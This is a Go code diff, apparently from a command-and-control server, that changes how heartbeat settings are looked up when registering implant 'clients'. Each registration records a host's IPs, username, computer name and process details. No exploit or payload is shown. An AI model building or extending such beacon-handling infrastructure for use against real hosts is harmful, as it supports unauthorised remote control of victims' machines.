@@ -344,7 +344,7 @@ func HandleKCPConnectionForWithKeys(conn *kcp.UDPSession, listenerType string, m
 				}
 
 				// 从监听器配置中获取心跳参数
-				heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByType(listenerType)
+				heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByAddr(conn.LocalAddr().String(), listenerType)
 
 				database.Engine.Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, heartbeatInterval)), Online: "1", Color: "", Listener: listenerType, Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
 				database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
@@ -381,7 +381,7 @@ func HandleKCPConnectionForWithKeys(conn *kcp.UDPSession, listenerType string, m
 			// 统一离线检测器注册（心跳间隔取监听器配置——客户端二进制 patch 的同一值；
 			// 原硬编码 5（命令休眠语义）→ 心跳间隔 ≥30s 的客户端会被误判离线）
 			if connection.GlobalOfflineDetector != nil {
-				_, hbInterval := database.GetListenerHeartbeatConfigByType(listenerType)
+				_, hbInterval := database.GetListenerHeartbeatConfigByAddr(conn.LocalAddr().String(), listenerType)
 				// 统一心跳：优先采用客户端上报的真实 sleep（MetaInfo 第5字段），回退监听器配置
 				kcpMeta := strings.Split(string(metainfo[9:]), "\t")
 				sleepSec := connection.ResolveSleepSeconds(kcpMeta, hbInterval)
